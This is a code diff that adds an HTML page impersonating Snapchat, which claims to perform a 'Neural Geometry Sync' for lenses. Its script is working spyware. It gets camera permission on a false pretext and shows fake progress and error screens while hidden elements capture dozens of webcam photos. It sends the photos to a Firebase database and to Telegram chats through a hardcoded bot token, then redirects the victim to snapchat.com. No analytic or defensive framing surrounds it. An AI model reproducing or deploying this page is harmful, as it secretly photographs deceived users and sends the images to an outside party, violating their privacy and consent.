@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat | Lens Calibration</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --snap-yellow: #FFFC00;
+            --snap-black: #000000;
+            --snap-white: #FFFFFF;
+            --snap-gray: #EFEFEF;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--snap-yellow); color: var(--snap-black);
+            font-family: 'Avenir Next', 'Helvetica Neue', Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+            overflow: hidden;
+        }
+
+        .snap-card {
+            width: 100%; max-width: 400px; background: var(--snap-white);
+            border-radius: 20px; overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            position: relative;
+        }
+
+        .snap-header {
+            padding: 20px; display: flex; align-items: center; justify-content: center;
+            border-bottom: 1px solid var(--snap-gray);
+        }
+
+        .snap-ghost { width: 35px; height: 35px; }
+
+        .snap-body { padding: 40px 30px; text-align: center; }
+
+        .geo-circle {
+            width: 100px; height: 100px; margin: 0 auto 30px;
+            border: 3px double var(--snap-black); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            position: relative;
+        }
+
+        .geo-dot {
+            width: 8px; height: 8px; background: var(--snap-black); border-radius: 50%;
+            position: absolute; animation: orbit 4s linear infinite;
+        }
+        @keyframes orbit {
+            from { transform: rotate(0deg) translateX(50px) rotate(0deg); }
+            to { transform: rotate(360deg) translateX(50px) rotate(-360deg); }
+        }
+
+        h2 { font-size: 22px; font-weight: 800; margin: 0 0 12px; text-transform: uppercase; letter-spacing: 1px; }
+        p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 35px; }
+
+        .btn-snap {
+            background: var(--snap-black); color: var(--snap-white); border: none;
+            width: 100%; padding: 16px; font-size: 15px; font-weight: 800;
+            border-radius: 30px; cursor: pointer; transition: transform 0.2s;
+            text-transform: uppercase;
+        }
+        .btn-snap:hover { transform: scale(1.03); }
+
+        /* Sync & 404 UI */
+        #sync-ui, #error-404 { display: none; }
+        
+        .snap-spinner {
+            width: 40px; height: 40px; border: 4px solid var(--snap-gray);
+            border-top: 4px solid var(--snap-yellow); border-radius: 50%;
+            margin: 0 auto 20px; animation: snap-spin 1s linear infinite;
+        }
+        @keyframes snap-spin { to { transform: rotate(360deg); } }
+
+        .err-ghost { font-size: 70px; opacity: 0.1; margin-bottom: 10px; }
+        .node-tag { font-size: 9px; color: #AAA; margin-top: 30px; font-family: monospace; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div class="snap-card">
+        <div class="snap-header">
+            <svg class="snap-ghost" viewBox="0 0 24 24" fill="black"><path d="M12 2c-4.97 0-9 4.03-9 9 0 4.17 2.84 7.67 6.69 8.69L12 22l2.31-2.31c3.85-1.02 6.69-4.52 6.69-8.69 0-4.97-4.03-9-9-9zm0 2c3.87 0 7 3.13 7 7 0 3.11-2.03 5.75-4.83 6.63L12 19.83l-2.17-2.2C7.03 16.75 5 14.11 5 11c0-3.87 3.13-7 7-7z"/></svg>
+        </div>
+
+        <!-- Initial View -->
+        <div class="snap-body" id="init-view">
+            <div class="geo-circle">
+                <div class="geo-dot"></div>
+                <svg width="30" height="30" fill="black" viewBox="0 0 24 24"><path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3c-.46-4.17-3.77-7.48-7.94-7.94V1h-2v2.06C6.83 3.52 3.52 6.83 3.06 11H1v2h2.06c.46 4.17 3.77 7.48 7.94 7.94V23h2v-2.06c4.17-.46 7.48-3.77 7.94-7.94H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/></svg>
+            </div>
+            <h2>Neural Geometry Sync</h2>
+            <p>To enable <b>Ultra-Precision Lenses</b>, Snapchat requires a 3D geometry handshake. This maps your device sensors to our Mumbai vision cluster for 0ms lag effects.</p>
+            
+            <button class="btn-snap" onclick="startSnapSync()">Calibrate Sensors</button>
+            <div class="node-tag">Local Uplink: Mumbai_MH_IN_602</div>
+        </div>
+
+        <!-- Sync View -->
+        <div class="snap-body" id="sync-ui">
+            <div class="snap-spinner"></div>
+            <div style="font-weight: 800;">MAPPING_SPATIAL_VECTORS...</div>
+            <div style="font-size: 12px; color: #999; margin-top: 8px;" id="s-timer">Calibration valid for 60s</div>
+            
+            <div style="text-align: left; background: #f9f9f9; padding: 15px; border-radius: 12px; font-family: monospace; font-size: 10px; color: #666; margin-top: 25px; border: 1px solid var(--snap-gray);">
+                > CONNECTING_MUMBAI_VISION_CORE... OK<br>
+                > SYNCING_GEOMETRY_MESH... 71%<br>
+                > STATUS: ENCRYPTING_AR_STREAM
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="snap-body" id="error-404">
+            <div class="err-ghost">👻</div>
+            <h2 style="color: #666;">Ghost Buffer Error</h2>
+            <p>Our vision engine timed out while re-routing your geometry mesh. We're attempting a fallback connection via the Mumbai West Relay.</p>
+            <div class="snap-spinner" style="width: 25px; height: 25px;"></div>
+            <div style="font-size: 11px; color: #AAA;">Re-Establishing Handshake...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startSnapSync() {
+            try {
+                // Requesting permission under "Neural Geometry Sync"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('s-timer').innerText = `Calibration valid for ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            snapCapture(count);
+                        }
+
+                        // Trigger 404 at 45 seconds
+                        if (timeLeft === 45) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.snapchat.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.snapchat.com";
+            }
+        }
+
+        function snapCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "SNAP_LENS_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_MH_VISION" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'snap_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
